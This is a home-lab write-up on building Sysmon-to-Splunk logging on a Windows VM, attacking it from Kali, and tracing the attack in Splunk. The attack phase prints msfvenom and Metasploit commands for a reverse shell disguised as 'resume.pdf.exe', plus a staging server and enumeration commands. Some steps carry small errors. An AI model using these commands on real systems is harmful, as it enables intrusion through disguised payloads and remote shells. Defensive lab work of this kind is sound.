# Endpoint Detection & Response (EDR) Simulation : Attack & Ingestion Lab

## 1) Requirements & Infrastructure
This home lab project demonstrates the implementation of defensive logging infrastructure, simulation of a real world adversarial execution attack lifecycle, and the subsequent forensic analysis within a SIEM platform.

* **Target Environment IP :** 192.168.64.13 (Windows Workstation running Sysmon & Splunk Enterprise)
* **Attacker Infrastructure IP :** 192.168.64.6 (Kali Linux Security Testing Platform)

---

## Phase 1 ~ Installation & Configuration

To establish a comprehensive defensive posture on the Windows, a centralized logging and analysis pipeline was built locally to monitor low level kernel activities.

### 1. Sysmon :
A local Windows background driver. That watches system behavior to capture critical host level telemetry and writes that information into the Windows Event Viewer.

* **Installation Steps ~**
(These steps are for Arm64 who are running Virtual machine on Macbook. For Windows just Download sysmon64.exe and remaning steps are same)
1) Step 1 : Download & Prepare Files
• Download the Sysinternals Suite and extract the files.
• Locate the ARM64 executable, sysmon64a.exe.
• Download Sysmon configuration file ⁠"SwiftOnSecurity Sysmon Configuration" from github.
• Move "sysmon64a.exe" and "sysmonconfig-export.xml" configuration file into the same directory (eg : C:\Sysmon)

2) Step 2 : Install Sysmon
• Open PowerShell or Command Prompt as an Administrator
• Navigate to your Sysmon directory ~
cd C \Sysmon
• Install Sysmon by passing the configuration file with the following command ~ sysmon64a.exe -accepteula -i sysmonconfig-export.xml
• Accept the End User License Agreement
3) Step 3 : Verify
• Open Event Viewer -> Applications and Services Logs -> Microsoft -> Windows -> Sysmon -> Operational.

### 2. Splunk Enterprise
The heavy duty SIEM software engine. Which ingests raw log files, breaks them down into searchable fields, lets you run complex queries, and builds dashboards.

* **Installation Steps ~** 
1) Step 1 : Download
• Create free account on Splunk official website.
• Navigate to the Splunk Enterprise & download as per ur system need.
• Run installation wizard & configure credentials. Now Open web browser and navigate to ~ http://localhost:8000 
• login using username and password

2) Step 2 : Install Splunk Technology Add-ons
• Splunk Add-on for Microsoft Windows
• Splunk Add-on for Sysmon

### 3. Ingest Sysmon logs into Splunk
* **Configuration Steps ~**

1) Step 1 : Create a index in Splunk
• Log in to your Splunk Web interface
• Navigate to Settings -> Indexes
• Click the New Index button
• In the Index Name field, type "endpoint"
• Click Save to create the index

2) Step 2 : Create Splunk Config File
• open Notepad as an Administrator and paste communication rule & save as inputs.conf :-
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = false
renderXml = true
index = endpoint
• Put this "inputs.conf" file to :- C:\Program Files\Splunk\etc\system\local\

3) Step 3 : Save and Restart Splunk
• Open Task Manager
• Click on the Services tab
• Locate Splunkd, right-click it, and select Restart

---

## Phase 2 ~ Attack Lifecycle Simulation

This phase outlines the simulated attack methodology executed from the Kali Linux testing asset to gain unauthorized command shell access on the Windows host.

### 1. Passive & Active Reconnaissance
* **Nmap Scanning :** Executed an aggressive service and script scan against the target asset to identify active entry pathways ~
```bash
nmap -p 3389 192.168.64.13
```
### 2. Weaponization & Payload Delivery
* **Msfvenom Payload Generation :** Executed an aggressive service and script scan against the target asset to identify active entry pathways ~
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.64.6 LPORT-4444 -f exe -o resume.pdf.exe
```
* **Staging Server Deployment :** Launched a lightweight Python HTTP application server to stage the malicious artifact for retrieval ~
```bash
python3 -m http.server 9999
```
### 3. Command & Control (C2) Exploitation
* **Metasploit Multi Handler Console :** Activated the backend socket handler on the Kali infrastructure to listen for inbound beacon calls from the target endpoint ~
```bash
msfconsole 
```
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.64.6
set LPORT 4444
exploit
```
* **Post-Exploitation Enumeration Commands :** Upon payload execution, an interactive interactive command terminal shell (cmd) was successfully obtained. The following tactical host-reconnaissance commands were performed through the stream ~
```bash
whoami      # Verified current user context ("Jay")
net user    # Enumerated all configured local accounts on the system
ipconfig    # Profiled network interface details and verified IP tracking
```
---

## Phase 3 ~ Splunk Ingestion & Forensic Telemetry Analysis

This final phase showcases the log verification and analytical troubleshooting methods required to isolate the adversarial blueprint out of raw logging inputs.

### 1. Query Optimization
```splunk
index=endpoint "resume.pdf.exe"
```
```splunk
index=endpoint "resume.pdf.exe" | rex field=_raw "Image'>(?<Image>[^<]+)" | rex field=_raw "CommandLine'>(<CommandLine>[^<]+)" | table _time, EventID, Image, CommandLine
```
### 2. Forensic Timeline Event Breakdown
The execution of the custom query uncovered an absolute match with the simulated timeline of the compromise

---

## Phase 4 ~ Defensive Remediations & Incident Containment

Following analysis, tactical incident responses were initiated to clean the environment and restore the security baseline

1) Process Eradication ~ Validated structural
process termination within Windows memory
space to guarantee no active C2 pipelines
remained open.
2) File Deletion ~ Used deep file purge (Shift +
Delete) on the target asset to completely
destroy the malicious resume.pdf.exe
3) Network Sanitization ~ Monitored socket
status on the Kali machine utilizing "sudo lsof
-i:4444 and :9999" commands to verify the
server links were securely killed and offline.
4) Endpoint Hardening Re alignment ~ Restored native defensive guardrails on the Windows machine by turning Real Time Protection and Tamper Protection back to their active, default on states.
